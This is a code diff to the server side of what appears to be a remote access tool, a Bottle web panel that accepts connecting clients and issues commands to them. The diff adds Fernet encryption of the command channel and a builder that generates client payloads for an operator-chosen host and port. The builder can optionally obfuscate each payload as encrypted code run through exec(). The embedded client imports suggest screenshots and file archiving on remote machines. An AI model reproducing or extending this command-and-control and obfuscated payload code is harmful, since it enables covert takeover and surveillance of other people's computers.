@@ -1,3 +1,4 @@
+from cryptography.fernet import Fernet
 from marshal import loads
 from subprocess import Popen, PIPE
 from bottle import Bottle, template, request, static_file, redirect, response
@@ -5,7 +6,6 @@ from socket import socket, error, gaierror
 import os
 from datetime import datetime
 from threading import Thread
-from cryptography.fernet import Fernet
 from win10toast import ToastNotifier
 toaster = ToastNotifier()
 # from email.mime import message, image, text, multipart, nonmultipart, base, audio
@@ -13,7 +13,8 @@ toaster = ToastNotifier()
 
 app = Bottle()
 secret_key = 'key'  # Secret key to encrypt cookies
-# os.system("cls")
+os.system("cls")
+os.system("title Remote Systems Administration($) CREATED BY SHAIL")
 print("Created By Shail")
 status_listen = False
 result = ""
@@ -21,6 +22,39 @@ down_dir = os.getcwd() + "\\downloads\\"
 all_clients = {}
 client_id = 0
 share = False
+
+def gen_key():
+    print("Not any key found\nGenerated new ENCRYPTION key")
+    key_file = "files\\ENCRYPTION.KEY"
+    key = Fernet.generate_key()
+    # key = "jwtU6dABBShoW0T6PGQP7d5mZDZjEUezwrDRmgjXr-g="
+    open(key_file, 'w').write(key)
+
+
+def get_key():
+    key_file = "files\\ENCRYPTION.KEY"
+    while True:
+        if os.path.isfile(key_file):
+            global cipher_suite
+            key = open(key_file, 'r').read()
+            cipher_suite = Fernet(key)
+            return key
+        else:
+            gen_key()
+
+
+# Function used for encrypting command
+# Remember that encryption with incresae data size more than half
+def encrypt_cmd(cmd):
+    return cipher_suite.encrypt(cmd)
+
+
+# Function used for decrypting command
+def decrypt_response(response):
+    try:
+        return cipher_suite.decrypt(response)
+    except:
+        return
 
 
 # Function used for adding header to data which tells
@@ -31,12 +65,13 @@ share = False
 # If you change size then don't forget to change this size in server side script
 # And also don't forget to change in "recvall()" function
 def sendall(conn, data):
+    data = encrypt_cmd(data)
     data = "{:<10}".format(len(data)) + data
     conn.send(data)
 
 
 # Function used for receiving all comming data using header
-# Seted data_part receiving bytes upto 10 bytes (DEFAULT)
+# Please set data_part receiving bytes upto 10 bytes
 # so header can completely receive in my case it is "1024" bytes
 def recvall(conn):
     new_data = True
@@ -44,13 +79,16 @@ def recvall(conn):
     while True:
         data_part = conn.recv(1024 * 100000)
         if new_data:
-            data_len = int(data_part[:10])
+            try:
+                data_len = int(data_part[:10])
+            except ValueError:
+                return
             data_part = data_part[10:]
             new_data = False
         data += data_part
         if len(data) == data_len:
             break
-    return data
+    return decrypt_response(data)
 
 
 # This function will bind and listen for connections
@@ -59,6 +97,7 @@ def bind_socket(host, port):
     global status_listen
     global listen_error
     s = socket()
+    get_key()
     try:
         s.bind((host, port))
         s.listen(5)
@@ -79,11 +118,15 @@ def accept_conn():
         conn, address = s.accept()
         s.setblocking(1)  # prevents timeout
         username = recvall(conn)
-        new_client = (conn, address, username)
-        all_clients[client_id] = new_client
-        client_id += 1
-        print("Found " + str(address))
-        # toaster.show_toast("Found", str(address))
+        if username:
+            new_client = (conn, address, username)
+            all_clients[client_id] = new_client
+            client_id += 1
+            print("Found " + str(address))
+            toaster.show_toast("Found", str(address))
+        else:
+            conn.close()
+            toaster.show_toast("Found", str(address) + ", But Invalid Data")
 
 
 # To get list and delete unconnected clients from list of connections
@@ -141,21 +184,52 @@ def listen():
         return redirect("/clients?mesg=" + "I'm already listening on other host and port")
 
 
+def encrypted_client(filename, client):
+    imports = """from cryptography.fernet import Fernet
+from socket import socket, error
+import os
+from subprocess import Popen, PIPE
+from time import sleep
+from pyautogui import screenshot
+from shutil import make_archive, copy2
+from marshal import dumps
+import sys
+import ctypes"""
+    key = Fernet.generate_key()
+    cipher_suite = Fernet(key)
+    client = cipher_suite.encrypt(client)
+    client_enc = "%s\nkey = '%s'\ncipher_suite = Fernet(key)\n" % (imports, key)
+    client_enc += "text = '%s'\nexec(cipher_suite.decrypt(text))" % (client)
+    open(filename, "w").write(client_enc)
+
+
+def plain_client(filename, client):
+    open(filename, "w").write(client)
+
+
+def payload(filename, crypt, host, port):
+    client = open("files\\client.py", 'r').read()
+    client = client.format(get_key(), ('"' + host + '"'), port)
+
+    # key = "8bH85AgvjWkKw4IlhI8Va3qprLXec2dipzS_9loLOp8="
+    # cipher_suite = Fernet(key)
+    # client = open("files\\client.enc", 'r').read()
+    # client = cipher_suite.decrypt(client).format(('"' + host + '"'), port)
+
+    if crypt == 'crypt':
+        encrypted_client(filename, client)
+    else:
+        plain_client(filename, client)
+
+
 @app.route('/create_client', method="POST")
 def create_client():
-    key = "8bH85AgvjWkKw4IlhI8Va3qprLXec2dipzS_9loLOp8="
-    cipher_suite = Fernet(key)
     host = request.forms['host']
     filename = "clients\\" + request.forms['filename'] + ".py"
     port = int(request.forms['port'])
-    # client = open("files\\client.py", 'r').read()
-    client = open("files\\client.enc", 'r').read()
-    client = cipher_suite.decrypt(client).format(('"' + host + '"'), port)
-    # client = client.format(('"' + host + '"'), port)
-    # client = compile(client, 'client', 'exec')
-    # client = repr(dumps(client))
-    open(filename, "w").write(client)
-    mesg = ("Your client File Has Been Released in " + filename)
+    crypt = request.forms['crypt']
+    payload(filename, crypt, host, port)
+    mesg = ("Your client File has been released --> " + filename)
     return redirect('/?mesg=' + mesg)
 
 
@@ -165,7 +239,13 @@ def clients():
         mesg = ""
         if request.query.get('mesg'):
             mesg = request.query['mesg']
-        clients = list_conn()
+        while True:
+            try:
+                clients = list_conn()
+                break
+            except Exception as msg:
+                print(msg)
+                continue
         return template("clients", clients=clients, mesg=mesg)
     return redirect("/?mesg=I'm not Listenning")
 
@@ -523,6 +603,12 @@ def screen_share_stop():
 
 
 if __name__ == '__main__':
+    host, port = open('files\\server.txt', 'r').read().split(':')
+    if not host:
+        host = "127.0.0.1"
+    print("\n------------------------------")
+    print("OPEN http://%s:%s" % (host, port))
+    print("------------------------------\n")
     from waitress import serve
-    serve(app, host="127.0.0.1", port=80, threads=6)
+    serve(app, host=host, port=int(port), threads=6)
     # run(app, host="127.0.0.1", port=80, debug=True, reloader=True)
